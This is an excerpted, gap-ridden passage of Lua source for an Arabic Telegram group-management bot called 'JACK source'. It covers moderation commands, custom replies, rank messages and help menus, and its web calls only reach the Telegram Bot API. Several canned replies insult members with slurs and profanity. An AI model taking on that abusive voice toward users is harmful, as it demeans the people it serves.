send(msg.chat_id_,msg.id_,' 𖤛 تم مسح {'..num..'}')  
...
send(msg.chat_id_, msg.id_," 𖤛 تم تنظيف جميع الميديا")
end
...
local Message = v
if Message then
t = " 𖤛 تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."S00F4:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = " 𖤛 لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
...
local numl = v
if numl then
l = " 𖤛 عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = " 𖤛 لا يوجد ميديا في المجموعه"
end
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تنظيف جميع الرسائل المعدله')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or '𝙅𝘼𝘾𝙆 𓃠').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or '𝙅𝘼𝘾𝙆 𓃠')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس 𝙅𝘼𝘾𝙆 𓃠و🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_," 𖤛 ليست لدي صلاحية تغير اسم الجروب")  
else
sebd(msg.chat_id_,msg.id_,' 𖤛 تم تغيير اسم الجروب الى {[↝'..Name..'↜]}')  
end
end,nil) 
end
...
send(msg.chat_id_, msg.id_," 𖤛 تم مسح الردود العامه")
end

if text == ("الردود العامه") and DevSoFi(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n 𖤛 قائمة الردود العامه \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,' 𖤛 تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd↝'..msg.sender_user_id_..'↜:'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' 𖤛 ارسل الرد الذي تريد اضافته')
...
send(msg.chat_id_, msg.id_,' 𖤛 تم ازالة الرد العام')
...
send(msg.chat_id_, msg.id_,' 𖤛 ارسل الكلمه تريد اضافتها')
...
send(msg.chat_id_, msg.id_,' 𖤛 ارسل الكلمه تريد مسحها')
...
send(msg.chat_id_, msg.id_," 𖤛 تم مسح الرد من ردود المتعدده")
...
send(msg.chat_id_, msg.id_," 𖤛تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_," 𖤛 تم مسح الردود")
end
...
send(msg.chat_id_, msg.id_,' 𖤛 تم ازالة الرد ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
...
send(msg.chat_id_, msg.id_,' 𖤛 ارسل الكلمه التي تريد اضافتها')
...
send(msg.chat_id_, msg.id_,' 𖤛 ارسل الكلمه التي تريد مسحها')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/55/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/53/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/39/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'عاش' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/27/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'اجري' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/30/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'لا' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/34/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الو' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/41/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'حبك' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/13/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == '𝙅𝘼𝘾𝙆 𓃠 غني' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '❨  𖤛• ⁽𖤛𝙅𝘼𝘾𝙆 𓃠𖤛₎ •𖤛 ❩', url="t.me/xx_shico"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/72/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'قمر' then
local Text = [[
]]
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/xx_Source_JACK/76/14&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/xx_Source_JACK/43/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'النشال' then
local Text = [[
]]
...
send(msg.chat_id_, msg.id_,' 𖤛لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n 𖤛قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..') '
status  = '\n 𖤛 الايدي  ⇇'..result.sender_user_id_..'\n 𖤛تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
...
send(msg.chat_id_, msg.id_,' 𖤛وينك وين القب ') 
else
send(msg.chat_id_, msg.id_,' 𖤛لقبك هو : '..GeId.result.custom_title) 
end
end
...
send(msg.chat_id_, msg.id_,'\n 𖤛صلاحيات البوت هي\n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n 𖤛  علامة ال {✔️} تعني مفعل\n 𖤛  علامة ال {✖} تعني غير مفعل\n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n 𖤛تغير معلومات المجموعة ↞ '..INf..'\n 𖤛مسح الرسائل ↞ '..DEL..'\n 𖤛حظر المستخدمين ↞ '..REs..'\n 𖤛دعوة المستخدمين ↞ '..INv..'\n 𖤛ثتبيت الرسالة ↞ '..Pin..'\n 𖤛اضافة مشرفين ↞ '..PRo)   
end
end
...
end --الكود حصري سورس 𝙅𝘼𝘾𝙆 𓃠يعني لو بكتهن راح اعرفك انت الاخذتهن
local t = "\n 𖤛المستخدم ~ ["..User_id .."] يصيح المشرفين \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
k = 0
...
return send(msg.chat_id_, msg.id_," 𖤛ارسل الرد الذي اريد اضافته")
end
...
return send(msg.chat_id_, msg.id_," 𖤛ارسل الان الكلمه لمسحها ")
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖤛تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖤛تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖤛تم حفظ الرد")
return false  
end  
end
if text then
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or '𝙅𝘼𝘾𝙆 𓃠').." غادر" or text == 'غادر' then  
...
Text = '\n 𖤛 تم تفعيل الردود العامه' 
else
Text = '\n 𖤛 بالتاكيد تم تفعيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤛 تم تعطيل الردود العامه' 
else
Text = '\n 𖤛 بالتاكيد تم تعطيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_,' رتبتك ↝ '..rtp..' ↜ 𖤛\n ') 
end
if text == "تفعيل انا مين"  then
if Constructor(msg) then  
database:set(bot_id.."my_anamen:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖤛تـم تـفعـيل انا مين") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," 𖤛 تـم تـعـطـيل انا مين") 
return false end
end
if text == 'انا مين' and SudoBot(msg) then 
local my_ph = database:get(bot_id.."my_anamen:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤛انا مين معطله") 
return false  
end
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[صاحب الخرابه يكسمك😂♥](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_, msg.id_," 𖤛تـم تـفعـيل ردود السورس") 
return false  
end
end
...
send(msg.chat_id_, msg.id_," 𖤛 تـم تـعـطـيل ردود السورس") 
return false end
end
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه 𝙅𝘼𝘾𝙆 𓃠 ') 
return false
end

if text == 'بحبك' or text == 'حبق' then
send(msg.chat_id_,msg.id_, '◍ خد قلبي.. ❤️👈🥺') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, '◍  عيب م قدم الناس..🥺💘') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/xx_Source_JACK)')
return false
end
...
local my_ph = database:get(bot_id.."my_GHoeq2:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤛معطله") 
return false  
end
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..𖤛♥️](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/xx_Source_JACK)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤𖤛](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..𖤛💕](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..??💕](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/xx_Source_JACK)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..𖤛💕](t.me/xx_Source_JACK)')
return false
end
end
end
...
'\n\n 𖤛 عدد رسائل الجروب : '..(msg.id_/2097152/0.5)..
'\n\n 𖤛  اسم الجروب : ['..ta.title_..']'
...
send(msg.chat_id_, msg.id_,' 𖤛 عذرا لا استطيع طرد ادمنية الجروب') 
return false  
end
if data and data.ID and data.ID == 'Ok' then
send(msg.chat_id_, msg.id_,' 𖤛 تم طردك من الجروب') 
...
if result.id_ then
send(msg.chat_id_, msg.id_,' 𖤛 😾تع يعم كلم الود دا قرفني [@↝'..username..'↜]') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
...
send(msg.chat_id_, msg.id_,' 𖤛 انت منشئ الجروب') 
return false
end
...
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖤛 هوا ابن القمر دا الي ضافك😹 ⇇'..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖤛 انت دخلت عبر الرابط يوسخ 🌝') 
end
end,nil)
else
...
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = ' 𖤛 هوا ابن الكلب دا الي ضافك😹 ⇇'..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,' 𖤛 انت دخلت عبر الرابط يوسخ 🌝') 
...
Text = ' 𖤛 تم تفعيل امر اطردني إلى عايز يخرج يتنيل 😹'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' 𖤛 بالتاكيد تم تفعيل امر اطردني مخلاص كفايه تفعيل الأمر 😾'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n 𖤛 تم تعطيل امر اطردني اترزع هن بقى مفيش خروج 😹'
else
Text = '\n 𖤛 بالتاكيد تم تعطيل امر اطردني مفيش خروج يولاد القمر 😹'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤛اكتب تفعيل نسبه جمالي") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," 𖤛نسبه جمالك هيا ⇜ %"..result.total_count_.." يختي قمر يجدعان 𖤛💕", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
...
[[
↑≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫𝙐𝙎𝙀𝙍𝙉𝘼𝙈𝙀 ➱ #username 𖤛  
↑≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫𝙄𝘿 ➱ #id
↑≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫𝙍𝘼𝙉𝙆 ➱  #stast 𖤛  
↑≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫𝙈𝘼𝙎𝙂 ➱ #msgs 𖤛  
↑≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫𝗖𝗛 ➯  ↝@xx_Source_JACK↜ 𖤛  
]],
[[
𝟓 𝟔 𖡻 #username  ࿇??
?? 𝟔 𖡻 #msgs  ࿇🦄
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تغير الايدي ارسل ايدي لرؤيته')
end
...
send(msg.chat_id_, msg.id_,  1, " 𖤛| تم اضافة له {"..numadded..'} من النقود', 1 , 'md')  
end
------------------------------------------------------------
...
send(msg.chat_id_, msg.id_," 𖤛 تم تغير رد الـعـضو  الى  ⇇"..Teext)
end
...
send(msg.chat_id_, msg.id_, ' 𖤛 الان يمكنك ارسال الكليشه ⓵')
...
[🎯ألعاب سورس 𝙅𝘼𝘾𝙆 𓃠 الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)
]]
keyboard = {} 
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم تعطيل حساب العمر')
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تفعيل حساب العمر')
...
send(msg.chat_id_, msg.id_," 𖤛تـم تـفعـيل مريم") 
return false  
end
end

if text == 'تفعيل مريم' then 
send(msg.chat_id_,msg.id_, ' 𖤛 تـم تـفـعـيـل مريم ') 
return false
end

if text == 'تعطيل مريم' then 
send(msg.chat_id_,msg.id_, ' 𖤛 تـم تـعـطـيل مريم ') 
return false
end
...
if not my_ph then
send(msg.chat_id_, msg.id_," 𖤛مريم  معطله") 
return false  
end
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"سارسل اليك اختيارت لو حليت صح ستنجو من العقاب لو خطأ سيقوم عليك العقاب🧟‍♀🧟‍♂❲عدد يقبل القسمة على 2,3,4,5,6 وعند القسمة في كل مرة يتبقى واحد، ما هو العدد؟❳❲61،44,00,121,90،99,71❳"}
...
if not database:get(bot_id..'lock:add'..msg.chat_id_) then
local texting = {"لقد فازت ونجوت من العقاب 👻𖤛 "}
send(msg.chat_id_, msg.id_, ''..texting[math.random(#texting)]..'')
end
end
if text == "99" or text == "71" or text == "44" or text == "00" or text == "121" or text == "90" then
local my_ph = database:get(bot_id.."my_maryam:status"..msg.chat_id_)
if not my_ph then
return false  
end
...
local Teext =[[
 ...
 𖤛❲ الادمن❳ ⇊
 ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 𖤛 رفع مميز ⌁ تنزيل مميز
 𖤛 الترحيب
 𖤛 اضف مغادره ⌁ مسح المغادره
 𖤛 رساله المغادره
 𖤛 كشف البوتات
 𖤛 المميزين ⌁  مسح المميزين
 𖤛 حظر ⌁ الغاء حظر
 𖤛 كتم ⌁ الغاء كتم
 𖤛 حظر لمده + المده
 𖤛 كتم لمده + المده
 𖤛 طرد ⌁ تطهير 
 𖤛 تثبيت ⌁ تثبيت بدون اشعار
 𖤛 الغاء تثبيت الكل
 𖤛  ❲ + ❳ جميع ماسبق
 ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 𖤛 ❲ المنشئ❳ ⇊
 ...
 𖤛 ايقاف المنشن
 ?? تعيين ⌁ مسح  ❲ الايدي ❳
 𖤛 الادمنيه ⌁  مسح الادمنيه
 𖤛 اضف ترحيب
 𖤛  مسح المحظورين ⌁ المكتومين
 𖤛 منع + الكلمه
 𖤛 الغاء منع + الكلمه
 𖤛  مسح الكلمات الممنوعه
 𖤛 المميزين عام
 𖤛  ❲ + ❳ جميع ماسبق
 ??━┅┄⟞⟦𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛⟧⟝┄┉━??
 𖤛 ❲ المالك❳ ⇊
 ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 𖤛 اضف صوره ⌁ وصف (للجروب)
 𖤛 رفع منشئ ⌁ تنزيل منشئ
 𖤛 تاج للاعضاء ⌁ للكل
 𖤛 اضف رابط ⌁ مسح الرابط
 𖤛 اضف ⌁  مسح  ❲ امر ❳
 𖤛 الاوامر المضافه
 𖤛  مسح الاوامر المضافه
 𖤛 ضع اسم+الاسم ⌁ تحديث
 𖤛 المنشئين ⌁  مسح المنشئين
 𖤛  ❲ + ❳ جميع ماسبق
 ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳ 
]]
...
local Teext =[[
 𖤛مرحب بيك في اوامر الوضع واضف 𖤛
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫ 
 𖤛اوامر الوضع - اضف
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 𖤛اضف / مسح ← رد
...
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 ...
 𖤛امسح
 𖤛صلاحيه
 𖤛قائمه منع المتحركات
 𖤛قائمه منع الصور
 𖤛قائمه منع الملصقات
 𖤛مسح قائمه المنع
 𖤛المحذوفين
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 𖤛مسح  امر + الامر القديم  
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 𖤛الاوامر المضافه ( لعرض الاوامر المضافه ) 
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳ 
]]
keyboard = {} 
...
local Teext =[[
 𖤛مرحب بيك في اوامر تنزيل ورفع 𖤛
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫ 
 𖤛اوامر تنزيل ورفع
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫ 
 𖤛مميز
...
𖤛━┅┄⟞⟦𝚂𝙾??𝚁𝙲𝙴 𝚅𝙸𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖤛
 𖤛تغير رد المطور + اسم
 𖤛تغير رد المالك + اسم
 𖤛تغير رد منشئ الاساسي + اسم
 𖤛تغير رد المنشئ + اسم
 𖤛تغير رد المدير + اسم
 𖤛تغير رد الادمن + اسم
 𖤛تغير رد المميز + اسم
 𖤛تغير رد الـعـضو  + اسم
 𖤛تغير امر الاوامر
 𖤛تغير امر م1 ~ الئ م10
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫ 
 𖤛اوامر المجموعه 📢 .
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 𖤛استعاده الاوامر 
 𖤛تحويل كالاتي⇜ بالرد على صوره او ملصق او صوت او بصمه بالامر ← تحويل 
 𖤛صيح ~ تاك ~ المميزين : الادمنيه : المدراء : المنشئين : المنشئين الاساسين
 𖤛كشف القيود
 𖤛تعين الايدي
 𖤛تغير الايدي
 𖤛الحساب + ايدي الحساب
 ...
 𖤛~┇~ الصور + متحركه + ملصق 
 𖤛حظر ~ كتم ~ تقيد ~ طرد
 𖤛المحظورين ~ المكتومين ~ المقيدين
 𖤛الغاء كتم + حظر + تقيد ~ بالرد و معرف و ايدي
 𖤛تقيد ~ كتم + الرقم + ساعه
 𖤛تقيد ~ كتم + الرقم + يوم
 𖤛تقيد ~ كتم + الرقم + دقيقه
 𖤛تثبيت ~ الغاء تثبيت
 𖤛الترحيب
 𖤛الغاء تثبيت الكل
 𖤛كشف البوتات
...
{
{text = 'Back 𖤛', callback_data="/help8"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
local Teext =[[
 𖤛مرحب بيك في اوامر للمطورين 𖤛
اوامر المطورين ⇊
❲المطرو❳  ⇊
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 𖤛تفعيل ← تعطيل 
 𖤛المجموعات ← المشتركين ← الاحصائيات
 𖤛رفع ← تنزيل منشئ اساسي
 𖤛مسح الاساسين ← المنشئين الاساسين
 𖤛مسح المنشئين ← المنشئين
 𖤛اسم ~ ايدي + بوت غادر 
 𖤛اذاعه 
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
...
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
 ...
 𖤛المنشئين الاساسين
 𖤛رفع/تنزيل منشئ اساسي
 𖤛رفع/تنزيل مطور اساسي 
 ??  رفع/تنزيل مدير عام
 𖤛  رفع /تنزيل ادمن عام
 𖤛مسح المطورين
 𖤛المطورين
 𖤛رفع | تنزيل مطور
 𖤛اسم البوت + غادر
 ...
 𖤛جلب نسخه البوت
 𖤛رفع نسخه البوت
 𖤛ضع عدد الاعضاء + العدد
 𖤛ضع كليشه المطور
 𖤛تفعيل/تعطيل الاذاعه
 𖤛تفعيل/تعطيل البوت الخدمي
 𖤛تفعيل/تعطيل التواصل
 𖤛تغير اسم البوت
 𖤛اضف/مسح رد عام
 𖤛 ??الردود العامه
 𖤛مسح الردود العامه
 𖤛الاشتراك الاجباري
 𖤛تعطيل الاشتراك الاجباري
 𖤛تفعيل الاشتراك الاجباري
 𖤛مسح رساله الاشتراك
 𖤛تغير رساله الاشتراك
 𖤛تغير الاشتراك
 𖤛الاحصائيات
 𖤛المشتركين
 𖤛المجموعات 
 𖤛تفعيل/تعطيل المغادره
 𖤛مسح الجروبات
≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳ 
]]
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
